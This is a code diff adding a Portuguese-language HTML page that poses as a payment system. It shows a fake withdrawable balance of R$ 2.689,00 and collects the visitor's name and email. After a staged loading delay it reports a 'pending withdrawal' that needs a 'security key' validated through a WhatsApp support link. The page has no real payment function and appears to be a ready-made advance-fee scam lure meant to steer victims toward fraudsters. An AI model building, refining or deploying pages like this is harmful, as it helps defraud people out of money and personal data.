@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Pagamentos Pro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #080808;
+            --card-bg: #121212;
+            --neon-green: #39ff14;
+            --neon-amber: #ffaa00;
+            --text-gray: #777;
+            --white: #ffffff;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--white);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container { width: 100%; max-width: 420px; padding: 20px; }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid #222;
+            border-radius: 24px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
+
+        /* VALOR EM DESTAQUE */
+        .amount-highlight {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: var(--neon-green);
+            margin: 15px 0;
+            text-shadow: 0 0 20px rgba(57, 255, 20, 0.2);
+        }
+
+        /* ESTILO DOS INPUTS */
+        .input-group { text-align: left; margin-bottom: 18px; }
+        label { font-size: 0.75rem; color: var(--text-gray); letter-spacing: 1px; margin-bottom: 8px; display: block; }
+        input {
+            width: 100%; padding: 15px; background: #1a1a1a; border: 1px solid #333;
+            border-radius: 12px; color: white; font-size: 1rem; box-sizing: border-box;
+        }
+        input:focus { outline: none; border-color: var(--neon-green); }
+
+        /* BOTÕES */
+        .btn {
+            width: 100%; padding: 18px; border: none; border-radius: 12px;
+            font-size: 1rem; font-weight: 800; cursor: pointer;
+            text-transform: uppercase; transition: 0.3s; margin-top: 10px;
+        }
+        .btn-neon {
+            background: var(--neon-green); color: #000;
+            box-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
+        }
+        .btn-support {
+            background: transparent; border: 2px solid var(--neon-green);
+            color: var(--neon-green); margin-top: 20px;
+        }
+        .btn:hover { transform: translateY(-2px); opacity: 0.9; }
+
+        /* TELA DE PENDÊNCIA (OCULTA) */
+        #pending-screen { display: none; }
+
+        .status-badge {
+            background: rgba(255, 170, 0, 0.1);
+            color: var(--neon-amber);
+            padding: 6px 15px;
+            border-radius: 50px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            border: 1px solid var(--neon-amber);
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .loader {
+            border: 3px solid #222; border-top: 3px solid var(--neon-green);
+            border-radius: 50%; width: 30px; height: 30px;
+            animation: spin 1s linear infinite; margin: 15px auto; display: none;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="screen-form" class="card">
+        <p style="color: var(--text-gray); margin: 0;">Saldo Disponível</p>
+        <div class="amount-highlight">R$ 2.689,00</div>
+        
+        <form id="saqueForm">
+            <div class="input-group">
+                <label>NOME DO TITULAR</label>
+                <input type="text" id="nome" placeholder="Nome Completo" required>
+            </div>
+            <div class="input-group">
+                <label>E-MAIL PARA NOTIFICAÇÃO</label>
+                <input type="email" id="email" placeholder="seu@email.com" required>
+            </div>
+            <div id="loading" class="loader"></div>
+            <button type="submit" id="btnProcurar" class="btn btn-neon">SOLICITAR SAQUE AGORA</button>
+        </form>
+    </div>
+
+    <div id="pending-screen" class="card">
+        <div class="status-badge">⚠️ REGULARIZAÇÃO NECESSÁRIA</div>
+        <h2 style="margin: 0 0 10px 0;">Saque Pendente</h2>
+        <p style="color: var(--text-gray); font-size: 0.9rem; line-height: 1.6;">
+            Olá, <strong id="display-name" style="color: #fff;"></strong>. <br>
+            Detectamos uma pendência de bônus no valor de <br>
+            <span style="color: var(--neon-green); font-weight: bold;">R$ 2.689,00</span>.
+        </p>
+        
+        <div style="background: #1a1a1a; padding: 15px; border-radius: 12px; margin: 20px 0; border-left: 4px solid var(--neon-amber);">
+            <p style="font-size: 0.8rem; margin: 0; color: #ccc; text-align: left;">
+                <strong>Motivo:</strong> Necessário validar chave de segurança junto ao suporte para liberar o saque imediato.
+            </p>
+        </div>
+
+        <button onclick="falarSuporte()" class="btn btn-neon">Volte ao Suporte no whatsapp para Finalizar</button>
+        <p style="font-size: 0.7rem; color: #444; margin-top: 15px;">ID: #ST-8829-BR</p>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('saqueForm');
+    const nomeInput = document.getElementById('nome');
+    const emailInput = document.getElementById('email');
+
+    // Manter dados salvos (LocalStorage)
+    window.onload = () => {
+        nomeInput.value = localStorage.getItem('user_name') || '';
+        emailInput.value = localStorage.getItem('user_email') || '';
+    }
+
+    nomeInput.oninput = () => localStorage.setItem('user_name', nomeInput.value);
+    emailInput.oninput = () => localStorage.setItem('user_email', emailInput.value);
+
+    form.onsubmit = (e) => {
+        e.preventDefault();
+        
+        // Efeito de carregamento
+        document.getElementById('btnProcurar').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('display-name').innerText = nomeInput.value;
+            document.getElementById('screen-form').style.display = 'none';
+            document.getElementById('pending-screen').style.display = 'block';
+        }, 1500);
+    };
+
+    function falarSuporte() {
+        // Aqui você pode colocar o link do WhatsApp ou Chat
+        window.open('https://wa.me/message/O75P6QLYN27TG1', '_blank');
+    }
+</script>
+
+</body>
+</html>
